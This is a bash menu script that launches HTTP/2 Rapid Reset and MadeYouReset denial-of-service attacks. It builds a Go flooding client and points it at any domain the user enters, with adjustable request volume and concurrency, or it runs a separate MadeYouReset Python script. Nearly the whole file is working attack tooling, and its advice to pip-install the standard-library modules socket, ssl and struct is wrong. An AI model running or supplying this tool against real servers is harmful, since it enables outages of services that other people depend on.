#!/bin/bash

# ===============================
# 🚀 Banner
# ===============================
echo "=============================================================="
echo "          🚀 Test This Attack With KP Yadav 🚀"
echo "=============================================================="
echo ""

# ===============================
# Menu
# ===============================
echo "Choose an attack type:"
echo "1) Rapid Reset Attack"
echo "2) MadeYouReset Attack"
read -p "👉 Enter choice [1-2]: " choice

# ===============================
# Option 1: Rapid Reset Attack
# ===============================
if [ "$choice" == "1" ]; then
    echo "🔥 You selected Rapid Reset Attack!"

    # Dependency Check & Build
    if [ ! -f "./rapidresetclient" ]; then
        echo "🔍 Checking dependencies and building tool..."
        go get golang.org/x/net/http2
        go get golang.org/x/net/http2/hpack
        go build -o rapidresetclient
        echo "✅ Build completed!"
    else
        echo "✅ Binary already exists, skipping build."
    fi

    # Ask for URL (mandatory)
    read -p "👉 Enter the target domain/URL (example: https://login.site.com:443): " target
    if [ -z "$target" ]; then
        echo "❌ ERROR: -url is mandatory!"
        exit 1
    fi

    # Ask for optional parameters with defaults
    read -p "📌 Enter number of requests (default: 20): " requests
    requests=${requests:-20}

    read -p "📌 Enter wait time (default: 100): " wait
    wait=${wait:-100}

    read -p "📌 Enter delay time (default: 10): " delay
    delay=${delay:-10}

    read -p "📌 Enter concurrency (default: 5): " concurrency
    concurrency=${concurrency:-5}

    echo ""
    echo "⚡ Starting Rapid Reset Attack with settings:"
    echo "   -requests=$requests"
    echo "   -url=$target"
    echo "   -wait=$wait"
    echo "   -delay=$delay"
    echo "   -concurrency=$concurrency"
    echo "--------------------------------------------------------------"

    ./rapidresetclient -requests="$requests" -url "$target" -wait="$wait" -delay="$delay" -concurrency="$concurrency"
fi

# ===============================
# Option 2: MadeYouReset Attack
# ===============================
if [ "$choice" == "2" ]; then
    echo "🔥 You selected MadeYouReset Attack!"

    # Check Python dependencies
    echo "🔍 Checking Python dependencies..."
    missing=0
    for module in socket ssl struct; do
        python3 -c "import $module" 2>/dev/null
        if [ $? -ne 0 ]; then
            echo "❌ Missing Python module: $module"
            missing=1
        fi
    done

    if [ $missing -eq 1 ]; then
        echo "⚠️ Please install missing modules before running:"
        echo "   pip3 install socket ssl struct"
        exit 1
    fi

    echo "✅ All Python dependencies found!"
    echo "⚡ Running MadeYouReset attack..."
    python3 madeyoureset.py
fi
